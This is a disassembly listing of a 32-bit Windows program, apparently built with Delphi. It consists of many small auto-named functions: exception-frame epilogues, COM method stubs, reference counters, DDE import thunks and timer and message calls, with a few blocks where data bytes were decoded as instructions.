call sub_45d18c
mov eax [ esp + 0x8 ]
sub eax [ esp ]
add esp 0x10
pop ebx
retn
sub_45d40c
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d418
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d424
push 0x4d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d430
push 0x4c
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d43c
push 0x4f
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d448
push 0x4e
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d454
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x58 ]
call sub_417570
pop esi
pop ebx
retn
sub_45d468
mov edx [ eax + 0x58 ]
mov edx [ edx + 0x8 ]
test edx edx
jne r-xdata
mov eax edx
retn
push 0x50
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45d484
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_417570
pop esi
pop ebx
retn
sub_45d498
mov eax [ eax + 0x4c ]
mov eax [ eax + 0x8 ]
retn
sub_45d4a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_417570
pop esi
pop ebx
retn
sub_45d4b4
mov eax [ eax + 0x50 ]
mov eax [ eax + 0x8 ]
retn
sub_45d590
mov eax [ eax + 0x54 ]
call sub_417414
retn
sub_45d59c
mov eax [ eax + 0x54 ]
call sub_4176b4
retn
sub_45d7ef
jmp sub_403a3c
sub_45d833
jmp sub_403a3c
sub_45d83a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_45d888
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45d688
mov eax esi
mov edx [ ebx + 0x38 ]
call sub_40408c
pop esi
pop ebx
retn
sub_45d8f4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x54 ]
call sub_417570
pop esi
pop ebx
retn
sub_45d908
mov eax [ eax + 0x54 ]
mov eax [ eax + 0x8 ]
retn
sub_45db0d
jmp sub_403a3c
sub_45db14
pop ebx
mov esp ebp
pop ebp
retn
sub_45db1c
inc [ eax + 0x8c ]
retn
sub_45db24
dec [ eax + 0x8c ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
retn
test [ eax + 0x8e ] 0x10
je r-xdata
call sub_45db44
sub_45db44
xor edx edx
call sub_45df88
retn
sub_45df7a
jmp sub_403a3c
sub_45e001
jmp sub_403a3c
sub_45e010
add eax 0x30
call sub_40d18c
retn
sub_45e054
jmp r-xdata
test eax eax
je r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x99 ] 0x0
je r-xdata
retn
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ eax + 0x30 ]
xor eax eax
sub_45e0a5
jmp sub_403788
sub_45e0aa
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_45e779
jmp sub_403a3c
sub_45e780
pop ebx
mov esp ebp
pop ebp
retn
sub_45e908
push ebx
inc [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x1
jne r-xdata
pop ebx
retn
cmp [ eax + 0xe2 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xe4 ]
call [ ebx + 0xe0 ]
sub_45e934
push ebx
dec [ eax + 0xb8 ]
cmp [ eax + 0xb8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0xea ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_45e960
xor edx edx
call sub_45e858
retn
sub_45e968
mov dl 0x1
call sub_45e858
retn
sub_45e9dc
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_45e9f4
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x34 ] 0x1
je r-xdata
mov al 0x1
retn
sub_45eac1
jmp sub_403a3c
sub_45eac8
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_403788#8
jmp sub_403788
sub_45f810
push ebx
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop ebx
retn
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
sub_45f866
jmp sub_403788
sub_45f94d
jmp sub_403788
sub_45f986
jmp sub_403a3c
sub_45f98d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45f994
call sub_40ccdc
test al al
je r-xdata
retn
push 0x0
call PostQuitMessage
sub_45fb8d
jmp sub_403a3c
sub_45fb94
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45fc5b
jmp sub_403a3c
sub_45fc62
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45fe38
jmp sub_403a3c
sub_45fe3f
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45fea0
jmp sub_403a3c
sub_45fea7
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_45feb0
call sub_45fc78
retn
j_sub_403788#7
jmp sub_403788
sub_4600f4
jmp sub_403a3c
sub_4600fb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460229
jmp sub_403a3c
sub_460388
push ebx
mov ebx eax
mov ax [ ebx + 0x8a ]
test ax ax
je r-xdata
pop ebx
retn
movzx eax ax
push eax
push 0x0
call KillTimer
mov [ ebx + 0x8a ] 0x0
sub_460687
jmp sub_403a3c
sub_4606b6
jmp sub_403a3c
sub_4607c2
jmp sub_403a3c
sub_4607c9
mov eax [ ebp - 0x4 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_460b5a
jmp sub_403a3c
sub_460b61
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_460ba4
cmp [ eax + 0xa4 ] 0x0
jne r-xdata
mov eax [ eax + 0xb0 ]
retn
push 0x0
push 0x1
push 0xb031
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
retn
sub_460cd4
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_460d1f
add [ edx ] ch
push 0x0
push 0x0
mov eax [ eax + 0x30 ]
push eax
call PostMessageA
retn
sub_460d30
mov edx [ rw-data ]
mov [ edx + 0x4 ] eax
mov [ edx ] r-xdata
retn
sub_460d40
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
retn
sub_460db3
jmp sub_403a3c
sub_460dba
pop ebp
retn
sub_460dbc
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_460d50
call sub_403e0c
call sub_460cd4
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
mov eax sub_456a30
call sub_417064
sub_460e4c
retn
sub_460e4d
jmp sub_403a3c
j_sub_460e4c
jmp sub_460e4c
sub_460e54
pop ebp
retn
sub_460e58
sub [ rw-data ] 0x1
retn
sub_4610c3
jmp sub_403a3c
sub_46115e
jmp sub_403a3c
sub_461184
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46101c
call sub_403a74
pop ebx
retn
sub_46138c
jmp sub_403a3c
sub_461393
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461438
jmp sub_403a3c
sub_46143f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4614ea
jmp sub_403a3c
sub_4614f1
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4616fc
jmp sub_403a3c
sub_461703
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_461a1c
jmp sub_403a3c
sub_461a23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_461a46
lea eax [ ebp - 0x50 ]
mov edx [ r-xdata ]
call sub_404a74
retn
sub_461a3f
jmp sub_403a3c
sub_461a46
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_461b64
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
retn
sub_461cdd
jmp sub_403a3c
sub_461ce4
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_461cec
push 0x0
xor ecx ecx
call sub_461c18
retn
sub_461cf8
xor ecx ecx
mov edx 0x20
call sub_402cfc
retn
sub_461fb6
jmp sub_403a3c
sub_461fbd
pop ebp
retn
sub_46203d
jmp sub_403a3c
sub_462044
pop ebp
retn
sub_462048
sub [ rw-data ] 0x1
retn
sub_4620db
add [ esp + 0x4 ] 0xfffffff0
jmp sub_46286c
sub_4620e5
add [ esp + 0x4 ] 0xfffffff0
jmp sub_4059d4
sub_4620ef
add [ esp + 0x4 ] 0xfffffff0
jmp sub_4059fc
sub_4620f9
add [ esp + 0x4 ] 0xfffffff0
jmp sub_405a10
sub_4621a5
add eax 0xffffffe0
jmp sub_462d80
sub_4621ad
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059d4
sub_4621b7
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059fc
sub_4621c1
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a10
sub_4621cb
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_4621d7
add [ esp + 0x4 ] 0xffffffdc
jmp sub_4059d4
sub_4621eb
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405a10
sub_4622c5
add eax 0xffffffe0
jmp sub_4630e8
sub_4622cd
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059d4
sub_4622d7
add [ esp + 0x4 ] 0xffffffe0
jmp sub_4059fc
sub_4622e1
add [ esp + 0x4 ] 0xffffffe0
jmp sub_405a10
sub_4622eb
add eax 0xffffffdc
push eax
mov eax [ eax ]
mov eax [ eax ]
xchg [ esp ] eax
retn
sub_4622f7
add [ esp + 0x4 ] 0xffffffdc
jmp sub_4059d4
sub_462301
add [ esp + 0x4 ] 0xffffffdc
jmp sub_4059fc
sub_46230b
add [ esp + 0x4 ] 0xffffffdc
jmp sub_405a10
sub_4625e3
jmp sub_403a3c
sub_4625ea
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46264a
jmp sub_403a3c
sub_462651
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46269b
jmp sub_403a3c
sub_4626a2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462728
cmp [ eax + 0x18 ] 0x0
jne r-xdata
retn
call sub_4627b8
sub_46279c
jmp sub_403a3c
sub_4627a3
pop ebx
pop ecx
pop ebp
retn
sub_4627b8
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
mov edx r-xdata
mov eax [ ebx + 0xc ]
call sub_461458
lea eax [ ebx + 0xc ]
call sub_405928
pop ebx
retn
sub_46284f
jmp sub_403788
sub_462854
call sub_4624d4
mov ebx eax
call sub_403af0
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_46286c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_462a2b
jmp sub_403a3c
sub_462a58
jmp sub_403a3c
sub_462a5f
pop ebx
mov esp ebp
pop ebp
retn
sub_462bcd
jmp sub_403a3c
sub_462bfa
jmp sub_403a3c
sub_462d4d
jmp sub_403a3c
sub_462d54
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_462dcf
jmp sub_403a3c
sub_462dd6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_462ddb
add [ edx ] al
loopne r-xdata
mov esi 0x101aa874
mov edi [ edx + 0x3000aa00 ]
or al 0xab
sub_462e96
jmp sub_403a3c
sub_462e9d
pop ecx
pop ecx
pop ebp
retn
sub_462f59
jmp sub_403a3c
sub_46303d
jmp sub_403a3c
sub_463069
jmp sub_403a3c
sub_4630c7
add [ eax + 0x327bf809 ] al
mov edi 0xbb8b101a
add [ edx - 0x54f3d000 ] ch
or [ ecx ] 0xbf327bf8
sbb dl [ eax ]
mov edi [ ebx + 0x3000aa00 ]
or al 0xab
sub_4630e8
push ebx
mov ebx eax
mov eax ebx
call sub_462734
mov eax ebx
mov edx [ eax ]
call [ edx + 0x4 ]
pop ebx
retn
sub_463130
retn
sub_463232
jmp sub_403a3c
sub_463384
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7d8
call sub_403a74
pop ebx
retn
sub_4633da
jmp sub_403a3c
sub_4633e1
pop ecx
pop ebp
retn
sub_463442
jmp sub_403a3c
sub_463449
pop ecx
pop ebp
retn
sub_46344c
retn
sub_463507
jmp sub_403a3c
sub_46350e
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_463563
jmp sub_403a3c
sub_46356a
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4635af
jmp sub_403a3c
sub_4635b6
pop ebx
pop ecx
pop ebp
retn 0x4
sub_4636ac
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x8000ffff
retn
push ecx
push edx
push eax
call [ rw-data ]
retn
sub_46374f
jmp sub_403a3c
sub_463756
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4637b5
jmp sub_403a3c
sub_4637bc
pop ebp
retn
sub_4637c0
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ r-xdata ]
push eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_4234a8
call sub_4635bc
sub_463849
jmp sub_403a3c
sub_463850
pop ebp
retn
sub_463854
sub [ rw-data ] 0x1
retn
sub_46385d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_46424c
sub_463867
add [ esp + 0x4 ] 0xfffffff8
jmp sub_46425c
sub_463871
add [ esp + 0x4 ] 0xfffffff8
jmp sub_464270
sub_46387b
add [ esp + 0x4 ] 0xfffffff8
jmp sub_46427c
sub_463885
add [ esp + 0x4 ] 0xfffffff8
jmp sub_4641bc
sub_46388f
add [ esp + 0x4 ] 0xfffffff8
jmp sub_464224
sub_463899
add [ esp + 0x4 ] 0xfffffff8
jmp sub_464238
sub_4640ee
jmp sub_403a3c
sub_4640f5
pop ebx
pop ecx
pop ebp
retn
sub_464159
jmp sub_403a3c
sub_464160
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464198
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40360c
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_464213
add [ eax ] al
add al 0x2
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
sub_464224
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_466580
pop ebp
retn 0x4
sub_464238
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
call sub_466598
pop ebp
retn 0x4
sub_46424c
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_46425c
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
xor edx edx
mov [ eax ] edx
mov eax 0x80004001
pop ebp
retn 0x10
sub_464270
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
j_sub_403788#6
jmp sub_403788
j_sub_403788#5
jmp sub_403788
sub_464890
jmp sub_403a3c
sub_464897
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_464a52
jmp sub_403a3c
sub_464a59
mov esp ebp
pop ebp
retn
sub_464b15
jmp sub_403788
sub_464b42
jmp sub_403a3c
sub_464b49
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_464c75
jmp sub_403788
sub_464c7a
call sub_403af0
pop edi
pop esi
pop ebx
pop ebp
retn
j_sub_4038b4#2
jmp sub_4038b4
sub_464df8
push ebx
mov ebx eax
mov eax [ ebx + 0x214 ]
test eax eax
je r-xdata
pop ebx
retn
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x214 ] eax
sub_464e64
call sub_464f10
retn
sub_464e6c
add esp 0xffffffe8
lea ecx [ esp + 0x8 ]
call sub_465078
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
add esp 0x18
retn
sub_464ef0
push ebx
add esp 0xfffffff0
mov ebx ecx
mov ecx esp
call sub_465078
mov eax ebx
mov edx [ esp + 0x8 ]
call sub_405940
add esp 0x10
pop ebx
retn
sub_464f74
add esp 0xfffffff0
mov ecx esp
call sub_465078
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_465036
jmp sub_403a3c
sub_46503d
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4650fa
jmp sub_403a3c
sub_465101
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465108
add esp 0xfffffff0
mov ecx esp
call sub_465078
mov ax [ esp + 0x8 ]
add esp 0x10
retn
sub_46516a
jmp sub_403a3c
sub_465171
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403788#4
jmp sub_403788
sub_4654e9
jmp sub_403788
sub_4654ee
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x8 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46550c
retn
sub_46565d
jmp sub_403a3c
sub_465664
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46566e
jmp sub_403788
sub_465673
mov eax [ ebp - 0x4 ]
call sub_464df8
call sub_403af0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_465730
call sub_465780
retn
sub_465738
call sub_465780
retn
sub_465768
add esp 0xfffffff0
mov [ esp ] 0x9
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_465afc
add esp 0x10
retn
sub_465780
add esp 0xfffffff0
mov [ esp ] 0x3
mov [ esp + 0x8 ] ecx
mov ecx esp
call sub_465afc
add esp 0x10
retn
sub_46583e
jmp sub_403a3c
sub_465845
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_46584c
add esp 0xfffffff0
mov [ esp ] 0xb
test cx cx
je r-xdata
mov [ esp + 0x8 ] 0x0
mov [ esp + 0x8 ] 0xffff
jmp r-xdata
mov ecx esp
call sub_465afc
add esp 0x10
retn
sub_465914
jmp sub_403a3c
sub_46591b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465924
call sub_465afc
retn
j_sub_403788#3
jmp sub_403788
sub_4659fc
jmp sub_403a3c
sub_465a03
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_465ad1
jmp sub_403a3c
sub_465aee
jmp sub_403a3c
sub_465af5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465ba3
jmp sub_403a3c
sub_465baa
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465bb4
add esp 0xfffffff0
mov [ esp ] 0x2
mov [ esp + 0x8 ] cx
mov ecx esp
call sub_465afc
add esp 0x10
retn
sub_465c20
jmp sub_403a3c
sub_465c27
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_465cce
jmp sub_403a3c
sub_465cd5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_403788#2
jmp sub_403788
sub_465f00
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45f9a8
call sub_403af0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4660a0
jmp sub_403a3c
sub_4660a7
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4660ca
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_464df8
sub_4660c3
jmp sub_403a3c
j_sub_4038b4
jmp sub_4038b4
sub_466271
jmp sub_403a3c
sub_4662fb
jmp sub_403a3c
sub_4663e0
jmp sub_403a3c
sub_4663fd
jmp sub_403a3c
sub_466404
mov esp ebp
pop ebp
retn
sub_466580
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_466598
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x20c ]
mov eax [ eax + 0x20c ]
pop ebp
retn 0x4
sub_4665b0
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_4665bc
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x80004001
pop ebp
retn 0x10
xor edx edx
mov [ eax ] edx
sub_4665d4
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax 0x80004002
pop ebp
retn 0x8
xor edx edx
mov [ eax ] edx
sub_4665ec
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
call sub_4651bc
xor eax eax
pop ebp
retn 0x4
sub_466600
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_4666b0
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x4
sub_466780
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0xc
sub_4667dc
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x4
sub_466928
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x230 ]
call sub_405928
lea eax [ ebx + 0x22c ]
call sub_405928
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_4669b0
push ebp
mov ebp esp
mov eax 0x800401a1
pop ebp
retn 0x8
sub_4669e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax ebx
call sub_4462e4
mov edx [ ebp + 0xc ]
mov [ edx ] eax
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_466a9c
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_466aa8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_466ab4
push ebp
mov ebp esp
mov eax 0x1
pop ebp
retn 0xc
sub_466ae4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_466b7e
mov edx [ esi + 0x70 ]
mov cl 0xfc
call sub_412f20
jmp sub_466c5e
sub_466b8d
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x8 ]
call sub_464178
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f0e0
jmp sub_466c5e
sub_466bd5
mov eax ebx
mov edx [ esi + 0x68 ]
mov edx [ edx + 0x18 ]
mov cl 0xfc
call sub_412f20
jmp sub_466c5e
sub_466be6
call GetUserDefaultLCID
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_412f20
jmp sub_466c5e
sub_466bf8
mov eax ebx
mov dl 0x1
call sub_4130f0
jmp sub_466c5e
sub_466c03
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
xor dl 0x1
call sub_4130f0
jmp sub_466c5e
sub_466c16
mov eax ebx
test [ esi + 0x1c ] 0x10
setne dl
call sub_4130f0
jmp sub_466c5e
sub_466c26
mov eax ebx
xor edx edx
call sub_4130f0
jmp sub_466c5e
sub_466c31
mov eax ebx
xor edx edx
call sub_4130f0
jmp sub_466c5e
sub_466c3c
mov eax ebx
mov dl 0x1
call sub_4130f0
jmp sub_466c5e
sub_466c47
mov eax ebx
mov dl 0x1
call sub_4130f0
jmp sub_466c5e
sub_466c5e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466c86
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404ac0
retn
sub_466c7f
jmp sub_403a3c
sub_466c86
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_466d34
jmp sub_403a3c
sub_466d97
jmp sub_403a3c
sub_466dfc
jmp sub_403a3c
sub_466e59
jmp sub_403a3c
j_sub_4038b4#3
jmp sub_4038b4
sub_466e98
jmp sub_403a3c
sub_466e9f
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_466eac
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x8
sub_466eb8
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_466ec4
push ebp
mov ebp esp
xor eax eax
pop ebp
retn 0x1c
sub_466f01
jmp sub_403a3c
sub_466f08
pop ebp
retn
sub_466f54
jmp sub_403a3c
sub_466f5b
pop ebp
retn
sub_4672b0
test dl dl
je r-xdata
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] 0x1
test dl dl
je r-xdata
add esp 0xfffffff0
call sub_40360c
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_467380
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
xor eax eax
pop ebp
retn 0x8
sub_4673a4
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x18
sub_46752f
lea eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_40527c
retn
sub_46753e
jmp sub_403a3c
j_sub_46752f
jmp sub_46752f
sub_467545
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_467550
xor edx edx
mov [ eax + 0x4 ] edx
test edx edx
je r-xdata
mov al 0x1
retn
xor eax eax
retn
sub_467628
retn
sub_467776
jmp sub_403a3c
sub_46777d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_467784
push ebx
mov ebx eax
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov al [ ebx + 0x48 ]
pop ebx
retn
mov al 0x3
pop ebx
retn
sub_467798
mov [ eax + 0x48 ] dl
retn
sub_46779c
push ebx
mov ebx eax
mov eax ebx
call sub_467784
cmp al 0x4
jne r-xdata
mov al [ ebx + 0x40 ]
pop ebx
retn
xor eax eax
pop ebx
retn
sub_4677b4
mov [ eax + 0x40 ] dl
retn
sub_4677e0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
inc [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_4677f0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
dec [ eax + 0x34 ]
mov eax [ eax + 0x34 ]
pop ebp
retn 0x4
sub_467825
jmp sub_403a3c
sub_46782c
pop ebp
retn
sub_467830
sub [ rw-data ] 0x1
jae r-xdata
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_416df8
sub_468d79
jmp sub_403a3c
sub_468d80
pop ebp
retn
sub_468d84
sub [ rw-data ] 0x1
retn
DdeInitializeA
jmp [ __import_lookup_table_17(user32:DdeInitializeA) ]
DdeUninitialize
jmp [ DdeUninitialize@IAT ]
DdeConnect
jmp [ __import_lookup_table_17(user32:DdeConnect) ]
DdeDisconnect
jmp [ DdeDisconnect@IAT ]
DdeQueryConvInfo
jmp [ __import_lookup_table_17(user32:DdeQueryConvInfo) ]
DdeSetUserHandle
jmp [ __import_lookup_table_17(user32:DdeSetUserHandle) ]
DdePostAdvise
jmp [ __import_lookup_table_17(user32:DdePostAdvise) ]
DdeNameService
jmp [ __import_lookup_table_17(user32:DdeNameService) ]
DdeClientTransaction
jmp [ __import_lookup_table_17(user32:DdeClientTransaction) ]
DdeCreateDataHandle
jmp [ __import_lookup_table_17(user32:DdeCreateDataHandle) ]
DdeAccessData
jmp [ __import_lookup_table_17(user32:DdeAccessData) ]
DdeUnaccessData
jmp [ __import_lookup_table_17(user32:DdeUnaccessData) ]
DdeFreeDataHandle
jmp [ __import_lookup_table_17(user32:DdeFreeDataHandle) ]
DdeGetLastError
jmp [ DdeGetLastError@IAT ]
DdeQueryStringA
jmp [ __import_lookup_table_17(user32:DdeQueryStringA) ]
DdeCmpStringHandles
jmp [ __import_lookup_table_17(user32:DdeCmpStringHandles) ]
sub_468e41
jmp sub_403a3c
sub_468e48
pop ebp
retn
sub_468e4c
sub [ rw-data ] 0x1
retn
sub_4692a4
out dx al
jmp [ esi * 4 - 0x4ac7ffba ]
sub_469902
jmp sub_403a3c
sub_469909
pop ebx
mov esp ebp
pop ebp
retn
sub_469bd4
jmp sub_403a3c
sub_469bdb
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_469d5c
jmp sub_403a3c
sub_469d63
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_469ea1
jmp sub_403a3c
sub_469ea8
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_469f98
jmp sub_403a3c
sub_469f9f
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_46a0ae
jmp sub_403a3c
sub_46a0b5
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46a167
